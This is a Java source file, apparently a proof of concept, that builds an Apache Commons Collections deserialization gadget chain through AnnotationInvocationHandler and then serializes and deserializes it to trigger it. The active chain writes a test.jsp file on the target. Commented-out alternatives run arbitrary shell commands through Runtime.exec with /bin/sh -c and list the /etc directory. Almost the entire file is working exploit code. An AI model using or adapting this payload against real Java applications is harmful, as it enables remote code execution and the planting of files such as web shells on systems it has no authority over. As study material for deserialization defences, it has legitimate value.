package com.example.testcases;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

class MaliciousObjectCreator {
    public static Object Reverse_Payload() throws Exception {
//        Transformer[] transformers = new Transformer[]{
//                new ConstantTransformer(Runtime.class),
//                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
//                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
//                new InvokerTransformer("exec", new Class[]{String[].class}, new Object[]{new String[]{"/bin/sh", "-c", "code"}})
//        };
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(FileOutputStream.class), // Constant for FileOutputStream
                new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String.class}}), // Get the constructor of FileOutputStream
                new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{"test.jsp"}}), // Instantiate FileOutputStream with the file path
                new InvokerTransformer("write", new Class[]{byte[].class}, new Object[]{"You, Hacked!".getBytes()}), // Write content to the file
                new InvokerTransformer("close", new Class[0], new Object[0]) // Close the FileOutputStream
        };

//        Transformer[] transformers = new Transformer[]{
//                new ConstantTransformer(File.class), // Constant for File class
//                new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String.class}}), // Get the constructor of File
//                new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{"/etc"}}), // Instantiate File with the directory path
//                new InvokerTransformer("list", null, null), // List filenames in the directory as an array of Strings
//        };

//        Transformer[] transformers = new Transformer[]{
//                new ConstantTransformer(FileOutputStream.class), // Constant for FileOutputStream
//                new InvokerTransformer("getConstructor", new Class[]{Class[].class}, new Object[]{new Class[]{String.class}}), // Get the constructor of FileOutputStream
//                new InvokerTransformer("newInstance", new Class[]{Object[].class}, new Object[]{new Object[]{"file.txt"}}), // Instantiate FileOutputStream with the file path
//                new InvokerTransformer("write", new Class[]{byte[].class}, new Object[]{
//                        // 添加自定义逻辑以在 write() 调用时打印堆栈信息
//                        new byte[]{'A', 'B', 'C'}, // 自定义内容写入文件
//                        new Transformer() {
//                            public Object transform(Object input) {
//                                Throwable throwable = new Throwable();
//                                throwable.printStackTrace();
//                                return input;
//                            }
//                        }
//                }),
//                new InvokerTransformer("close", new Class[0], new Object[0]) // Close the FileOutputStream
//        };

        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innermap = new HashMap();
        innermap.put("value", "value");
        Map outmap = TransformedMap.decorate(innermap, null, transformerChain);

        //通过反射获得AnnotationInvocationHandler类对象
        Class cls = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");

        //通过反射获得cls的构造函数
        Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);

        //这里需要设置Accessible为true，否则序列化失败
        ctor.setAccessible(true);

        //通过newInstance()方法实例化对象
        Object instance = ctor.newInstance(Retention.class, outmap);
        return instance;
    }

    public static void main(String[] args) throws Exception {
        GeneratePayload(Reverse_Payload(), "obj");
        payloadTest("obj");
    }

    public static void GeneratePayload(Object instance, String file) throws Exception {
        //将构造好的payload序列化后写入文件中
        File f = new File(file);
        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
        out.writeObject(instance);
        out.flush();
        out.close();
    }

    public static void payloadTest(String file) throws Exception {
        //读取写入的payload，并进行反序列化
        ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
        in.readObject();
        in.close();
    }
}